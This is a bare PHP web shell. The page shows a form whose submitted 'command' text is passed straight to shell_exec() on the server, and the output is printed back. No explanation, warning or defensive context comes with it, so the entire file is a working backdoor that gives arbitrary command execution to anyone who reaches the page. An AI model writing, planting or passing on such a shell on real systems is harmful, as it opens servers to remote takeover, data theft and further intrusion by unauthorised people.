<pre>
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
  <textarea name="command" rows="10" cols="80"></textarea>
  <input type="submit" value="Execute" />
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $command = $_POST["command"];
  $output = shell_exec($command);
  echo "<hr/><b>Command:</b> " . htmlspecialchars($command) . "<br/>";
  echo "<b>Output:</b><br/>" . htmlspecialchars($output);
}
?>

<h3>Command Output</h3>
</pre>
